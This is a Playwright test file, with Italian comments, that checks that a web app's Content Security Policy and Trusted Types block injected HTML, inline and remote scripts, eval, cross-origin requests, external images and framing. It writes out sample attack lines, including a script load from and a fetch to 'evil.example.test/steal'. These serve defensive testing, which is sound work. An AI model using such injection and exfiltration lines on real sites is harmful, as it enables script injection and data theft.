// SR-023 / THR-070: la CSP con Trusted Types è applicata dal browser. Prima prova che la
// pagina vera non produce violazioni (anche per `style-src 'self'`, revisione del debito di
// SL-00a), poi prova che il browser blocca davvero ciò che la politica vieta.
import { expect, test } from "@playwright/test";
import { observe, VIEWS } from "./support/browser";

for (const view of VIEWS) {
  test(`nessuna violazione CSP né errore di console su ${view.name}`, async ({ page }) => {
    const seen = await observe(page);
    await page.goto(view.path);
    await page.getByRole("heading", { level: 1 }).waitFor();
    await page.waitForLoadState("networkidle");
    expect(
      await seen.cspViolations(),
      "violazioni CSP (script, stile, immagini, connessioni)",
    ).toEqual([]);
    expect(seen.consoleErrors).toEqual([]);
    expect(seen.pageErrors).toEqual([]);
  });
}

test.describe("il browser applica la politica", () => {
  test.beforeEach(async ({ page }) => {
    await observe(page);
    await page.goto("/accedi");
    await page.getByRole("heading", { level: 1 }).waitFor();
  });

  test("Trusted Types: innerHTML con una stringa è bloccato", async ({ page }) => {
    const outcome = await page.evaluate(() => {
      try {
        document.body.innerHTML = '<b id="injected">x</b>';
        return "consentito";
      } catch (error) {
        return (error as Error).name;
      }
    });
    expect(outcome).toBe("TypeError");
    expect(await page.locator("#injected").count()).toBe(0);
  });

  test("Trusted Types: insertAdjacentHTML, document.write e script con testo sono bloccati", async ({
    page,
  }) => {
    const outcomes = await page.evaluate(() => {
      const attempt = (fn: () => void): string => {
        try {
          fn();
          return "consentito";
        } catch (error) {
          return (error as Error).name;
        }
      };
      return {
        adjacent: attempt(() => document.body.insertAdjacentHTML("beforeend", "<i>x</i>")),
        write: attempt(() => document.write("<i>x</i>")),
        scriptText: attempt(() => {
          const script = document.createElement("script");
          script.textContent = "window.__pwned = 1";
          document.head.append(script);
        }),
        scriptSrc: attempt(() => {
          const script = document.createElement("script");
          script.src = "https://evil.example.test/x.js";
          document.head.append(script);
        }),
      };
    });
    expect(outcomes).toEqual({
      adjacent: "TypeError",
      write: "TypeError",
      scriptText: "TypeError",
      scriptSrc: "TypeError",
    });
    expect(
      await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned),
    ).toBeUndefined();
  });

  test("trusted-types 'none': non si può creare nessuna policy", async ({ page }) => {
    const outcome = await page.evaluate(() => {
      try {
        const tt = (
          window as unknown as {
            trustedTypes: { createPolicy: (name: string, rules: object) => unknown };
          }
        ).trustedTypes;
        tt.createPolicy("evil", { createHTML: (value: string) => value });
        return "consentito";
      } catch (error) {
        return (error as Error).name;
      }
    });
    expect(outcome).toBe("TypeError");
  });

  test("script-src: eval, new Function e setTimeout(stringa) sono bloccati per gli script della pagina", async ({
    page,
    request,
  }) => {
    // `page.evaluate` passa dal protocollo di debug, che può aggirare il blocco di eval: la
    // prova va fatta con uno script della pagina, servito con gli stessi header dell app.
    const real = await request.get("/accedi");
    const headers = {
      "content-type": "text/html",
      "content-security-policy": real.headers()["content-security-policy"] ?? "",
    };
    await page.route("**/__probe/page.html", (route) =>
      route.fulfill({
        status: 200,
        headers,
        body: '<!doctype html><title>probe</title><script src="/__probe/run.js"></script>',
      }),
    );
    await page.route("**/__probe/run.js", (route) =>
      route.fulfill({
        status: 200,
        contentType: "text/javascript",
        body: `const attempt = (fn) => { try { fn(); return 'consentito'; } catch (error) { return error.name; } };
               window.__probe = { evalCall: attempt(() => eval('1 + 1')), newFunction: attempt(() => new Function('return 1')()) };`,
      }),
    );
    await page.goto("/__probe/page.html");
    const probe = await page.evaluate(
      () => (window as unknown as { __probe: Record<string, string> }).__probe,
    );
    expect(probe["evalCall"]).not.toBe("consentito");
    expect(probe["newFunction"]).not.toBe("consentito");
  });

  test("connect-src: una richiesta verso un altro dominio non parte e genera una violazione", async ({
    page,
  }) => {
    const external: string[] = [];
    page.on("request", (request) => {
      if (!request.url().startsWith(page.url().split("/").slice(0, 3).join("/")))
        external.push(request.url());
    });
    const outcome = await page.evaluate(async () => {
      try {
        await fetch("https://evil.example.test/steal");
        return "consentito";
      } catch (error) {
        return (error as Error).name;
      }
    });
    expect(outcome).toBe("TypeError");
    const violations = await page.evaluate(
      () => (window as unknown as { __csp: Array<{ directive: string }> }).__csp,
    );
    expect(violations.map((v) => v.directive)).toContain("connect-src");
  });

  test("img-src: un immagine esterna è bloccata", async ({ page }) => {
    await page.evaluate(() => {
      const image = new Image();
      image.src = "https://evil.example.test/pixel.png";
    });
    await expect
      .poll(async () =>
        (
          await page.evaluate(
            () => (window as unknown as { __csp: Array<{ directive: string }> }).__csp,
          )
        ).map((v) => v.directive),
      )
      .toContain("img-src");
  });

  test("frame-ancestors: la pagina non si può incorniciare (clickjacking)", async ({
    page,
    baseURL,
  }) => {
    const framed = await page.evaluate(
      (url) =>
        new Promise<string>((resolve) => {
          const frame = document.createElement("iframe");
          frame.addEventListener("load", () => {
            try {
              resolve(frame.contentDocument ? "caricata" : "bloccata");
            } catch {
              resolve("bloccata");
            }
          });
          frame.src = url;
          document.body.append(frame);
          setTimeout(() => resolve("bloccata"), 3000);
        }),
      `${baseURL}/accedi`,
    );
    expect(framed).toBe("bloccata");
  });
});
